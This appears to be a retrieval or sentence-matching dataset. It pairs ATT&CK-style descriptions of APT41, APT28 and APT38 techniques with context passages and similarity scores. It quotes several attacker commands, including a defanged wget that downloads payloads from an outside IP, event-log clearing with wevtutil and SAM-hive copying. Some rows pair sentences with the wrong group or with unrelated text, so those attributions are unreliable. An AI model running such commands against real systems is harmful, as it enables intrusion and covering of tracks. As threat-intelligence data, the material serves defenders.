"the group has previously exploited cve-2017-8570, cve-2012-1856, cve-2014-4114, cve-2017-0199, cve-2017-11882, and cve-2015-1641.","[7]apt41leveraged vulnerabilities such as proxylogon exploitation or sql injection for initial access. [6]duringc0017,apt41exploited cve-2021-44207 in the usaherds application and cve-2021-44228 in log4j, as well as other .net deserialization, sql injection, and directory traversal vulnerabilities to gain initial access.","[5]enterpriset1203exploitation for client executionapt41leveraged the follow exploits in their operations: cve-2012-0158, cve-2015-1641, cve-2017-0199, cve-2017-11882, and cve-2019-3396.","[1]enterpriset1068exploitation for privilege escalationduringc0017,apt41abused named pipe impersonation for privilege escalation. [5]enterpriset1133external remote servicesapt41compromised an online billing/payment service using vpn access between a third-party service provider and the targeted payment service.",66f57dc63063d29485700ce4,4847,0.7568610646741867
"apt41 leveraged the follow exploits in their operations: cve-2012-0158, cve-2015-1641, cve-2017-0199, cve-2017-11882, and cve-2019-3396.","[7]apt41leveraged vulnerabilities such as proxylogon exploitation or sql injection for initial access. [6]duringc0017,apt41exploited cve-2021-44207 in the usaherds application and cve-2021-44228 in log4j, as well as other .net deserialization, sql injection, and directory traversal vulnerabilities to gain initial access.","[5]enterpriset1203exploitation for client executionapt41leveraged the follow exploits in their operations: cve-2012-0158, cve-2015-1641, cve-2017-0199, cve-2017-11882, and cve-2019-3396.","[1]enterpriset1068exploitation for privilege escalationduringc0017,apt41abused named pipe impersonation for privilege escalation. [5]enterpriset1133external remote servicesapt41compromised an online billing/payment service using vpn access between a third-party service provider and the targeted payment service.",66f57dc63063d29485700ce4,4847,0.913225640163206
apt41 compromised an online billing/payment service using vpn access between a third-party service provider and the targeted payment service.,"[5]enterpriset1203exploitation for client executionapt41leveraged the follow exploits in their operations: cve-2012-0158, cve-2015-1641, cve-2017-0199, cve-2017-11882, and cve-2019-3396. [1]enterpriset1068exploitation for privilege escalationduringc0017,apt41abused named pipe impersonation for privilege escalation.",[5]enterpriset1133external remote servicesapt41compromised an online billing/payment service using vpn access between a third-party service provider and the targeted payment service.,"[1]enterpriset1008fallback channelsapt41used the steam community page as a fallback mechanism for c2. [1]enterpriset1083file and directory discoveryapt41has executedfile /bin/pwdon exploited victims, perhaps to return architecture related information.",66f57dc63063d29485700ce4,4849,0.8511069340458088
apt41 used the steam community page as a fallback mechanism for c2.,"[1]enterpriset1068exploitation for privilege escalationduringc0017,apt41abused named pipe impersonation for privilege escalation. [5]enterpriset1133external remote servicesapt41compromised an online billing/payment service using vpn access between a third-party service provider and the targeted payment service.",[1]enterpriset1008fallback channelsapt41used the steam community page as a fallback mechanism for c2.,"[1]enterpriset1083file and directory discoveryapt41has executedfile /bin/pwdon exploited victims, perhaps to return architecture related information. [7]enterpriset1589.001gather victim identity information:credentialsto support initial access,apt41gained access to databases with information about existing accounts as well as plaintext and hashed passwords.",66f57dc63063d29485700ce4,4850,0.7332369627566614
"apt41 has used hashdump, mimikatz, and the windows credential editor to dump password hashes from memory and authenticate to other user accounts.","[5]enterpriset1588.002obtain capabilities:toolapt41has obtained and used tools such asmimikatz,pwdump,powersploit, andwindows credential editor. [1]forc0017,apt41obtained publicly available tools such as ysoserial.net, confuserex, and badpotato.","[5]enterpriset1003.001os credential dumping:lsass memoryapt41has used hashdump,mimikatz, and the windows credential editor to dump password hashes from memory and authenticate to other user accounts.","[1][2].002os credential dumping:security account managerapt41extracted user account data from the security account managerr (sam), making a copy of this database from the registry using thereg savecommand or by exploiting volume shadow copies. [6]duringc0017,apt41copied thesamandsystemregistry hives for credential harvesting.",66f57dc63063d29485700ce4,4880,0.7291025852792693
apt41 used a malware variant called goodluck to modify the registry in order to steal credentials.,"[5].005masquerading:match legitimate name or locationapt41attempted to masquerade their files as popular anti-virus software. [1][2]duringc0017,apt41used file names beginning with users, sysuser, and syslog fordeadeye, and changedkeyplugfile extensions from .vmp  to .upx likely to avoid hunting detections.",[5]enterpriset1112modify registryapt41used a malware variant called goodluck to modify the registry in order to steal credentials.,[1][2]enterpriset1104multi-stage channelsapt41used the storescyncsvc.dll beacon backdoor to download a secondary backdoor. [7]enterpriset1046network service discoveryapt41used a malware variant called widetone to conduct port scans on specified subnets.,66f57dc63063d29485700ce4,4870,0.7282168263094132
apt41 used the storescyncsvc.dll beacon backdoor to download a secondary backdoor.,"[1][2]duringc0017,apt41used file names beginning with users, sysuser, and syslog fordeadeye, and changedkeyplugfile extensions from .vmp  to .upx likely to avoid hunting detections. [5]enterpriset1112modify registryapt41used a malware variant called goodluck to modify the registry in order to steal credentials.",[1][2]enterpriset1104multi-stage channelsapt41used the storescyncsvc.dll beacon backdoor to download a secondary backdoor.,[7]enterpriset1046network service discoveryapt41used a malware variant called widetone to conduct port scans on specified subnets. [1]enterpriset1135network share discoveryapt41used thenet sharecommand as part of network reconnaissance.,66f57dc63063d29485700ce4,4871,0.7224482137235859
apt41 used a malware variant called widetone to conduct port scans on specified subnets.,[5]enterpriset1112modify registryapt41used a malware variant called goodluck to modify the registry in order to steal credentials. [1][2]enterpriset1104multi-stage channelsapt41used the storescyncsvc.dll beacon backdoor to download a secondary backdoor.,[7]enterpriset1046network service discoveryapt41used a malware variant called widetone to conduct port scans on specified subnets.,[1]enterpriset1135network share discoveryapt41used thenet sharecommand as part of network reconnaissance. [1][2]enterpriset1027obfuscated files or informationapt41used vmprotected binaries in multiple intrusions.,66f57dc63063d29485700ce4,4872,0.7693493486132847
apt41 malware tidyelf loaded the main winterlove component by injecting it into the iexplore.exe process.,[6]enterpriset1566.001phishing:spearphishing attachmentapt41sent spearphishing emails with attachments such as compiled html (.chm) files to initially compromise their victims. [1]enterpriset1542.003pre-os boot:bootkitapt41deployed master boot record bootkits on windows systems to hide their malware and maintain persistence on victim systems.,[1]enterpriset1055process injectionapt41malware tidyelf loaded the main winterlove component by injecting it into the iexplore.exe process.,"[1]enterpriset1090proxyapt41used a tool called classfon to covertly proxy network communications. [1]duringc0017,apt41used the cloudflare cdn to proxy c2 traffic.",66f57dc63063d29485700ce4,4887,0.801128980772345
apt41 used a tool called classfon to covertly proxy network communications.,[1]enterpriset1542.003pre-os boot:bootkitapt41deployed master boot record bootkits on windows systems to hide their malware and maintain persistence on victim systems. [1]enterpriset1055process injectionapt41malware tidyelf loaded the main winterlove component by injecting it into the iexplore.exe process.,[1]enterpriset1090proxyapt41used a tool called classfon to covertly proxy network communications.,"[1]duringc0017,apt41used the cloudflare cdn to proxy c2 traffic. [5]enterpriset1012query registryapt41queried registry values to determine items such as configured rdp ports and network configurations.",66f57dc63063d29485700ce4,4888,0.8073799977930186
"the group has also used a malware variant, highnoon, to enumerate active rdp sessions.","[1][2]duringc0017,apt41usedcmd.exe /c ping %userdomain%for discovery. [5]enterpriset1049system network connections discoveryapt41has enumerated ip addresses of network resources and used thenetstatcommand as part of network reconnaissance.","the group has also used a malware variant, highnoon, to enumerate active rdp sessions.","[1][2]enterpriset1033system owner/user discoveryapt41has executedwhoamicommands, including using the wmiexec utility to execute this on remote machines. [1][6]duringc0017,apt41usedwhoamito gather information from victim machines.",66f57dc63063d29485700ce4,4908,1.0000000000000002
apt41 used http to download payloads for cve-2019-19781 and cve-2020-10189 exploits.,"[1]enterpriset1595.002active scanning:vulnerability scanningapt41used the acunetix sql injection vulnerability scanner in target reconnaissance operations, as well as the jexboss tool to identify vulnerabilities in java applications. [6].003active scanning:wordlist scanningapt41leverages various tools and frameworks to brute-force directories on web servers.",[6]enterpriset1071.001application layer protocol:web protocolsapt41used http to download payloads for cve-2019-19781 and cve-2020-10189 exploits.,"[7]duringc0017,apt41ranwget http://103.224.80[. ]44:8080/kernelto download malicious payloads.",66f57dc63063d29485700ce4,4809,0.7108797991500746
apt41 created the storsyncsvc service to provide persistence for cobalt strike.,[5]enterpriset1136.001create account:local accountapt41has created user accounts. [1]enterpriset1543.003create or modify system process:windows serviceapt41modified legitimate windows services to install malware backdoors.,[1][2]apt41created the storsyncsvc service to provide persistence for cobalt strike.,"[7]enterpriset1555.003credentials from password stores:credentials from web browsersapt41used browserghost, a tool designed to obtain credentials from browsers, to retrieve information from password stores. [6]enterpriset1486data encrypted for impactapt41used a ransomware called encryptor raas to encrypt files on the targeted systems and provide a ransom note to the user.",66f57dc63063d29485700ce4,4828,0.7368554669568488
"apt41 leveraged the follow exploits in their operations: cve-2012-0158, cve-2015-1641, cve-2017-0199, cve-2017-11882, and cve-2019-3396.","[7]apt41leveraged vulnerabilities such as proxylogon exploitation or sql injection for initial access. [6]duringc0017,apt41exploited cve-2021-44207 in the usaherds application and cve-2021-44228 in log4j, as well as other .net deserialization, sql injection, and directory traversal vulnerabilities to gain initial access.","[5]enterpriset1203exploitation for client executionapt41leveraged the follow exploits in their operations: cve-2012-0158, cve-2015-1641, cve-2017-0199, cve-2017-11882, and cve-2019-3396.","[1]enterpriset1068exploitation for privilege escalationduringc0017,apt41abused named pipe impersonation for privilege escalation. [5]enterpriset1133external remote servicesapt41compromised an online billing/payment service using vpn access between a third-party service provider and the targeted payment service.",66f57dc63063d29485700ce4,4847,0.913225640163206
"apt28 has used several malicious applications that abused oauth access tokens to gain access to target email accounts, including gmail and yahoo mail.","[5][38][11][30][13][2]enterpriset1221template injectionapt28used weaponized microsoft word documents abusing the remote template function to retrieve a malicious macro. [48]enterpriset1199trusted relationshiponceapt28gained access to the dccc network, the group then proceeded to use that access to compromise the dnc network.","[3]enterpriset1550.001use alternate authentication material:application access tokenapt28has used several malicious applications that abused oauth access tokens to gain access to target email accounts, including gmail and yahoo mail.",[47].002use alternate authentication material:pass the hashapt28has used pass the hash for lateral movement. [33]enterpriset1204.001user execution:malicious linkapt28has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,66f57ea33063d29485700d48,3032,0.7375628608429119
apt28 used a publicly available tool to gather and compress multiple documents on the dccc and dnc networks.,"[29]enterpriset1071.001application layer protocol:web protocolslater implants used byapt28, such aschopstick, use a blend of http, https, and other legitimate channels for c2, depending on module configuration. [6][2].003application layer protocol:mail protocolsapt28has used imap, pop3, and smtp for a communication channel in various implants, including using self-registered google mail accounts and later compromised email servers of its victims.",[6][2]enterpriset1560archive collected dataapt28used a publicly available tool to gather and compress multiple documents on the dccc and dnc networks.,"[3].001archive via utilityapt28has used a variety of utilities, including winrar, to archive collected data with password protection. [2]enterpriset1119automated collectionapt28used a publicly available tool to gather and compress multiple documents on the dccc and dnc networks.",66f57ea33063d29485700d48,2947,0.7691540323988393
apt28 used a publicly available tool to gather and compress multiple documents on the dccc and dnc networks.,"[6][2]enterpriset1560archive collected dataapt28used a publicly available tool to gather and compress multiple documents on the dccc and dnc networks. [3].001archive via utilityapt28has used a variety of utilities, including winrar, to archive collected data with password protection.",[2]enterpriset1119automated collectionapt28used a publicly available tool to gather and compress multiple documents on the dccc and dnc networks.,[3]enterpriset1547.001boot or logon autostart execution:registry run keys / startup folderapt28has deployed malware that has copied itself to the startup directory for persistence. [21]enterpriset1037.001boot or logon initialization scripts:logon script (windows)anapt28loader trojan adds the registry keyhkcu\\\\environment\\\\userinitmprlogonscriptto establish persistence.,66f57ea33063d29485700d48,2949,0.784929367875982
"apt28 has used a variety of utilities, including winrar, to archive collected data with password protection.","[6][2].003application layer protocol:mail protocolsapt28has used imap, pop3, and smtp for a communication channel in various implants, including using self-registered google mail accounts and later compromised email servers of its victims. [6][2]enterpriset1560archive collected dataapt28used a publicly available tool to gather and compress multiple documents on the dccc and dnc networks.","[3].001archive via utilityapt28has used a variety of utilities, including winrar, to archive collected data with password protection.",[2]enterpriset1119automated collectionapt28used a publicly available tool to gather and compress multiple documents on the dccc and dnc networks. [3]enterpriset1547.001boot or logon autostart execution:registry run keys / startup folderapt28has deployed malware that has copied itself to the startup directory for persistence.,66f57ea33063d29485700d48,2948,0.7256592087942999
the bootkit shares code with some variants of blackenergy.,[31][16].003spearphishing linkapt28has conducted credential phishing campaigns with embedded links to attacker-controlled domains. [28]enterpriset1542.003pre-os boot:bootkitapt28has deployed a bootkit along withdowndelphto ensure its persistence on the victim.,the bootkit shares code with some variants ofblackenergy.,"[20]enterpriset1057process discoveryanapt28loader trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions. [30]enterpriset1090.002proxy:external proxyapt28used other victims as proxies to relay command traffic, for instance using a compromised georgian military email server as a hop point to nato victims.",66f57ea33063d29485700d48,3016,0.7158412216027534
"apt38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.","gfw implemented a mitm attack on icloud using a self-signed certificate.the authorities only attacked ip 23.59.94.46. not all users in china are affected because the icloud dns might return different ip addresses.wirecapture with mitm:https://www.cloudshark.org/captures/03a6b0593436self-signed certificate used in the attack:http://www.mediafire.com/download/ampbnqncc277krv/fakeicloudcert.zipconnection log:http://pastebin.com/tn7kbdv3traceroute:http://pastebin.com/8y6zwfzghotmail mitmwirecap:https://www.cloudshark.org/captures/6011389a8ea3tcp traceroute:https://twitter.com/siyanmao/status/518963824481681408 enterpriset1071.001application layer protocol:web protocolsapt38used a backdoor, quickride, to communicate to the c2 server over http and https.","[2]enterpriset1217browser information discoveryapt38has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.",[1]enterpriset1110brute forceapt38has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable. [1]enterpriset1115clipboard dataapt38used a trojan called keylime to collect data from the clipboard.,66f57e233063d29485700d12,1358,0.8727908427408579
apt38 has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.,"enterpriset1071.001application layer protocol:web protocolsapt38used a backdoor, quickride, to communicate to the c2 server over http and https. [2]enterpriset1217browser information discoveryapt38has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.",[1]enterpriset1110brute forceapt38has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.,[1]enterpriset1115clipboard dataapt38used a trojan called keylime to collect data from the clipboard. [2]enterpriset1059.001command and scripting interpreter:powershellapt38has used powershell to execute commands and other operational tasks.,66f57e233063d29485700d12,1359,0.8246838347176263
apt28 has used compromised office 365 service accounts with global administrator privileges to collect email from user inboxes.,"the group has specifically used credentials stolen through a spearphishing email to login to the dccc network. the group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via iot devices such as a voip phone, printer, and video decoder.",[49][3][23][2].004cloud accountsapt28has used compromised office 365 service accounts with global administrator privileges to collect email from user inboxes.,[2]enterpriset1102.002web service:bidirectional communicationapt28has used google drive for c2. [21],66f57ea33063d29485700d48,3039,0.732828904396433
poetrat has executed a lua script through a lua interpreter for windows.,"once it reaches 0, the data stealing payload cleans itself from the usb stick. this makes sure that sticks with gauss infections do not survive itw for long enough to results in detection.what programming language was used?",lua?,"ooc?just like flame, gauss is programmed in c++. they share a fair deal of code, probably low level libraries which are used in both projects.",66f57e103063d29485700d08,1064,0.7638365741532385
apt28 uses a tool that captures information from air-gapped computers via an infected usb and transfers it to network-connected computer when the usb is inserted.,[11][21][2].003command and scripting interpreter:windows command shellanapt28loader trojan uses a cmd.exe and batch script to run its payload. [30]the group has also used macros to execute payloads.,[18][32][17][21]enterpriset1092communication through removable mediaapt28uses a tool that captures information from air-gapped computers via an infected usb and transfers it to network-connected computer when the usb is inserted.,[33]enterpriset1586.002compromise accounts:email accountsapt28has used compromised email accounts to send credential phishing emails. [28]enterpriset1584.008compromise infrastructure:network devicesapt28compromised ubiquiti network devices to act as collection devices for credentials compromised via phishing webpages.,66f57ea33063d29485700d48,2960,0.7601000146223283
apt38 has used a custom secure delete function to make deleted files unrecoverable.,[2].005command and scripting interpreter:visual basicapt38has used vbscript to execute commands and other operational tasks. [1]enterpriset1543.003create or modify system process:windows serviceapt38has installed a new windows service to establish persistence.,[1]enterpriset1485data destructionapt38has used a custom secure delete function to make deleted files unrecoverable.,[2]enterpriset1486data encrypted for impactapt38has used hermes ransomware to encrypt files with aes256. [2]enterpriset1005data from local systemapt38has collected data from a compromised host.,66f57e233063d29485700d12,1365,0.722478954624176
apt28 has split archived exfiltration files into chunks smaller than 1mb.,[6]enterpriset1074.001data staged:local data stagingapt28has stored captured credential information in a file named pi.log. [33].002data staged:remote data stagingapt28has staged archives of collected data on a target's outlook web access (owa) server.,[2]enterpriset1030data transfer size limitsapt28has split archived exfiltration files into chunks smaller than 1mb.,[2]enterpriset1140deobfuscate/decode files or informationanapt28macro uses the commandcertutil -decodeto decode contents of a .txt file storing the base64 encoded payload. [36][11]enterpriset1189drive-by compromiseapt28has compromised targets via strategic web compromise utilizing custom exploit kits.,66f57ea33063d29485700d48,2972,0.7326949369909622
"apt38 have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.","[2][1]enterpriset1083file and directory discoveryapt38have enumerated files and directories, or searched in specific locations within a compromised host. [1]enterpriset1562.003impair defenses:impair command history loggingapt38has prepended a space to all of their terminal commands to operate without leaving traces in the histcontrol environment.","[1].004impair defenses:disable or modify system firewallapt38have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.",[1]enterpriset1070.001indicator removal:clear windows event logsapt38clears window event logs and sysmon logs from the system. [2].004indicator removal:file deletionapt38has used a utility called closeshave that can securely delete a file from the system.,66f57e233063d29485700d12,1375,0.7846302360145779
"apt28 registered domains imitating nato, osce security websites, caucasus information resources and other organizations.",enterpriset1134.001access token manipulation:token impersonation/theftapt28has used cve-2015-1701 to access the system token and copy it into the current process as part of privilege escalation. [27]enterpriset1098.002account manipulation:additional email delegate permissionsapt28has used a powershell cmdlet to grant theapplicationimpersonationrole to a compromised account.,"[2]enterpriset1583.001acquire infrastructure:domainsapt28registered domains imitating nato, osce security websites, caucasus information resources, and other organizations.",[6][14][28].003acquire infrastructure:virtual private serverapt28hosted phishing domains on free services for brief periods of time during campaigns. [26].006acquire infrastructure:web servicesapt28has used newly-created blogspot pages for credential harvesting operations.,66f57ea33063d29485700d48,2941,0.7273073399198294
apt38 has conducted watering holes schemes to gain initial access to victims.,[2].003data manipulation:runtime data manipulationapt38has used dyepack.fox to manipulate pdf data as it is accessed to remove traces of fraudulent swift transactions from the data displayed to the end user. [2]enterpriset1561.002disk wipe:disk structure wipeapt38has used a custom mbr wiper named bootwreck to render systems inoperable.,[2]enterpriset1189drive-by compromiseapt38has conducted watering holes schemes to gain initial access to victims.,"[2][1]enterpriset1083file and directory discoveryapt38have enumerated files and directories, or searched in specific locations within a compromised host. [1]enterpriset1562.003impair defenses:impair command history loggingapt38has prepended a space to all of their terminal commands to operate without leaving traces in the histcontrol environment.",66f57e233063d29485700d12,1372,0.7261858743722622
"apt28 has used a variety of public exploits, including cve 2020-0688 and cve 2020-17144, to gain execution on vulnerable microsoft exchange; they have also conducted sql injection attacks against external websites.",[37][13]enterpriset1048.002exfiltration over alternative protocol:exfiltration over asymmetric encrypted non-c2 protocolapt28has exfiltrated archives of collected data previously staged on a target's owa server via https. [2]enterpriset1567exfiltration over web serviceapt28can exfiltrate data over google drive.,"[21]enterpriset1190exploit public-facing applicationapt28has used a variety of public exploits, including cve 2020-0688 and cve 2020-17144, to gain execution on vulnerable microsoft exchange; they have also conducted sql injection attacks against external websites.",[14][2]enterpriset1203exploitation for client executionapt28has exploited microsoft office vulnerability cve-2017-0262 for execution. [22]enterpriset1211exploitation for defense evasionapt28has used cve-2015-4902 to bypass security features.,66f57ea33063d29485700d48,2981,0.8642173361338763
jhuhugit has exploited cve-2015-1701 and cve-2015-2387 to escalate privileges.,[14][2]enterpriset1203exploitation for client executionapt28has exploited microsoft office vulnerability cve-2017-0262 for execution. [22]enterpriset1211exploitation for defense evasionapt28has used cve-2015-4902 to bypass security features.,"[38][33]enterpriset1068exploitation for privilege escalationapt28has exploited cve-2014-4076, cve-2015-2387, cve-2015-1701, cve-2017-0263 to escalate privileges.",[38][33][22]enterpriset1210exploitation of remote servicesapt28exploited a windows smb remote code execution vulnerability to conduct lateral movement. [6][39][40]enterpriset1133external remote servicesapt28has usedtorand a variety of commercial vpn services to route brute force authentication attempts.,66f57ea33063d29485700d48,2984,0.712710709108381
"apt28 has exploited cve-2014-4076, cve-2015-2387, cve-2015-1701, cve-2017-0263 to escalate privileges.",[14][2]enterpriset1203exploitation for client executionapt28has exploited microsoft office vulnerability cve-2017-0262 for execution. [22]enterpriset1211exploitation for defense evasionapt28has used cve-2015-4902 to bypass security features.,"[38][33]enterpriset1068exploitation for privilege escalationapt28has exploited cve-2014-4076, cve-2015-2387, cve-2015-1701, cve-2017-0263 to escalate privileges.",[38][33][22]enterpriset1210exploitation of remote servicesapt28exploited a windows smb remote code execution vulnerability to conduct lateral movement. [6][39][40]enterpriset1133external remote servicesapt28has usedtorand a variety of commercial vpn services to route brute force authentication attempts.,66f57ea33063d29485700d48,2984,0.8740913331796104
"apt28 used other victims as proxies to relay command traffic, for instance using a compromised georgian military email server as a hop point to nato victims.",the bootkit shares code with some variants ofblackenergy. [20]enterpriset1057process discoveryanapt28loader trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.,"[30]enterpriset1090.002proxy:external proxyapt28used other victims as proxies to relay command traffic, for instance using a compromised georgian military email server as a hop point to nato victims.",the group has also used a tool that acts as a proxy to allow c2 even if the victim is behind a router.apt28has also used a machine to relay and obscure communications betweenchopstickand their server. [6][38][3].003proxy:multi-hop proxyapt28has routed traffic overtorand vpn servers to obfuscate their activities.,66f57ea33063d29485700d48,3018,0.7810767770934482
the group has also used a tool that acts as a proxy to allow c2 even if the victim is behind a router.,"[20]enterpriset1057process discoveryanapt28loader trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions. [30]enterpriset1090.002proxy:external proxyapt28used other victims as proxies to relay command traffic, for instance using a compromised georgian military email server as a hop point to nato victims.",the group has also used a tool that acts as a proxy to allow c2 even if the victim is behind a router.apt28has also used a machine to relay and obscure communications betweenchopstickand their server.,[6][38][3].003proxy:multi-hop proxyapt28has routed traffic overtorand vpn servers to obfuscate their activities. [21]enterpriset1021.002remote services:smb/windows admin sharesapt28has mapped network drives usingnetand administrator credentials.,66f57ea33063d29485700d48,3019,0.735214623692102
"apt28 has intentionally deleted computer files to cover their tracks, including with use of the program ccleaner.","[18][18].003hide artifacts:hidden windowapt28has used the windowstyle parameter to concealpowershellwindows. [11][41]enterpriset1070.001indicator removal:clear windows event logsapt28has cleared event logs, including by using the commandswevtutil cl systemandwevtutil cl security.","[5][3].004indicator removal:file deletionapt28has intentionally deleted computer files to cover their tracks, including with use of the program ccleaner.","[3].006indicator removal:timestompapt28has performed timestomping on victim files. [5]enterpriset1105ingress tool transferapt28has downloaded additional files, including by using a first-stage downloader to contact the c2 server to obtain the second-stage implant.",66f57ea33063d29485700d48,2993,0.7576379308088649
"they have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.",[1]enterpriset1070.001indicator removal:clear windows event logsapt38clears window event logs and sysmon logs from the system. [2].004indicator removal:file deletionapt38has used a utility called closeshave that can securely delete a file from the system.,"they have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.","[2][1].006indicator removal:timestompapt38has modified data timestamps to mimic files that are in the same folder on a compromised host. [1]enterpriset1105ingress tool transferapt38used a backdoor, nestegg, that has the capability to download and upload files to and from a victim’s machine.",66f57e233063d29485700d12,1378,1.0
the group also searched a compromised dccc computer for specific terms.,"[6][39][40]enterpriset1133external remote servicesapt28has usedtorand a variety of commercial vpn services to route brute force authentication attempts. [2]enterpriset1083file and directory discoveryapt28has usedforfilesto locate pdf, excel, and word documents during collection.",the group also searched a compromised dccc computer for specific terms.,[35][3]enterpriset1589.001gather victim identity information:credentialsapt28has harvested user's login credentials. [31]enterpriset1564.001hide artifacts:hidden files and directoriesapt28has saved files with hidden file attributes.,66f57ea33063d29485700d48,2988,1.0
apt38 has prepended a space to all of their terminal commands to operate without leaving traces in the histcontrol environment.,"[2]enterpriset1189drive-by compromiseapt38has conducted watering holes schemes to gain initial access to victims. [2][1]enterpriset1083file and directory discoveryapt38have enumerated files and directories, or searched in specific locations within a compromised host.",[1]enterpriset1562.003impair defenses:impair command history loggingapt38has prepended a space to all of their terminal commands to operate without leaving traces in the histcontrol environment.,"[1].004impair defenses:disable or modify system firewallapt38have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443. [1]enterpriset1070.001indicator removal:clear windows event logsapt38clears window event logs and sysmon logs from the system.",66f57e233063d29485700d12,1374,0.7106486209767756
"apt28 has downloaded additional files, including by using a first-stage downloader to contact the c2 server to obtain the second-stage implant.","[5][3].004indicator removal:file deletionapt28has intentionally deleted computer files to cover their tracks, including with use of the program ccleaner. [3].006indicator removal:timestompapt28has performed timestomping on victim files.","[5]enterpriset1105ingress tool transferapt28has downloaded additional files, including by using a first-stage downloader to contact the c2 server to obtain the second-stage implant.",[38][30][17][21][2]enterpriset1056.001input capture:keyloggingapt28has used tools to perform keylogging. [33][3][21]enterpriset1559.002inter-process communication:dynamic data exchangeapt28has deliveredjhuhugitandkoadicby executing powershell commands through dde in word documents.,66f57ea33063d29485700d48,2995,0.8068217702797638
"apt38 used a backdoor, nestegg, that has the capability to download and upload files to and from a victim’s machine.","they have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process. [2][1].006indicator removal:timestompapt38has modified data timestamps to mimic files that are in the same folder on a compromised host.","[1]enterpriset1105ingress tool transferapt38used a backdoor, nestegg, that has the capability to download and upload files to and from a victim’s machine.",[2]enterpriset1056.001input capture:keyloggingapt38used a trojan called keylime to capture keystrokes from the victim’s machine. [2]enterpriset1112modify registryapt38uses a tool called cleantoad that has the capability to modify registry keys.,66f57e233063d29485700d12,1380,0.7016358040202704
"apt28 added ""junk data"" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm.",[35][3][29][2]enterpriset1039data from network shared driveapt28has collected files from network shared drives. [2]enterpriset1025data from removable mediaanapt28backdoor may collect the entire contents of an inserted usb device.,"[33]enterpriset1001.001data obfuscation:junk dataapt28added ""junk data"" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm.","each implant was given a ""junk length"" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire. [6]enterpriset1074.001data staged:local data stagingapt28has stored captured credential information in a file named pi.log.",66f57ea33063d29485700d48,2968,0.7895991370612219
"each implant was given a ""junk length"" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.","[2]enterpriset1025data from removable mediaanapt28backdoor may collect the entire contents of an inserted usb device. [33]enterpriset1001.001data obfuscation:junk dataapt28added ""junk data"" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm.","each implant was given a ""junk length"" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.",[6]enterpriset1074.001data staged:local data stagingapt28has stored captured credential information in a file named pi.log. [33].002data staged:remote data stagingapt28has staged archives of collected data on a target's outlook web access (owa) server.,66f57ea33063d29485700d48,2969,1.0000000000000002
they have also dumped the lsass process memory using the minidump function.,[43]enterpriset1003os credential dumpingapt28regularly deploys both publicly available (ex:mimikatz) and custom password retrieval tools on victims. [44][3][14].001lsass memoryapt28regularly deploys both publicly available (ex:mimikatz) and custom password retrieval tools on victims.,[44][3]they have also dumped the lsass process memory using the minidump function.,[2].003ntdsapt28has used the ntdsutil.exe utility to export the active directory database for credential access. [2]enterpriset1120peripheral device discoveryapt28uses a module to receive a notification every time a usb mass storage device is inserted into a victim.,66f57ea33063d29485700d48,3008,0.9131963830589038
"apt28 has used imap, pop3, and smtp for a communication channel in various implants, including using self-registered google mail accounts and later compromised email servers of its victims.","[28]enterpriset1595.002active scanning:vulnerability scanningapt28has performed large-scale scans in an attempt to find vulnerable servers. [29]enterpriset1071.001application layer protocol:web protocolslater implants used byapt28, such aschopstick, use a blend of http, https, and other legitimate channels for c2, depending on module configuration.","[6][2].003application layer protocol:mail protocolsapt28has used imap, pop3, and smtp for a communication channel in various implants, including using self-registered google mail accounts and later compromised email servers of its victims.","[6][2]enterpriset1560archive collected dataapt28used a publicly available tool to gather and compress multiple documents on the dccc and dnc networks. [3].001archive via utilityapt28has used a variety of utilities, including winrar, to archive collected data with password protection.",66f57ea33063d29485700d48,2946,0.8261895724977997
sandworm team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,"[3]enterpriset1550.001use alternate authentication material:application access tokenapt28has used several malicious applications that abused oauth access tokens to gain access to target email accounts, including gmail and yahoo mail. [47].002use alternate authentication material:pass the hashapt28has used pass the hash for lateral movement.",[33]enterpriset1204.001user execution:malicious linkapt28has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,"[14][16].002user execution:malicious fileapt28attempted to get users to click on microsoft office attachments containing malicious macro scripts. [36][17][16]enterpriset1078valid accountsapt28has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network.",66f57ea33063d29485700d48,3034,0.7720169915012491
apt28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,"[3]enterpriset1550.001use alternate authentication material:application access tokenapt28has used several malicious applications that abused oauth access tokens to gain access to target email accounts, including gmail and yahoo mail. [47].002use alternate authentication material:pass the hashapt28has used pass the hash for lateral movement.",[33]enterpriset1204.001user execution:malicious linkapt28has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,"[14][16].002user execution:malicious fileapt28attempted to get users to click on microsoft office attachments containing malicious macro scripts. [36][17][16]enterpriset1078valid accountsapt28has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network.",66f57ea33063d29485700d48,3034,0.7894782505524257
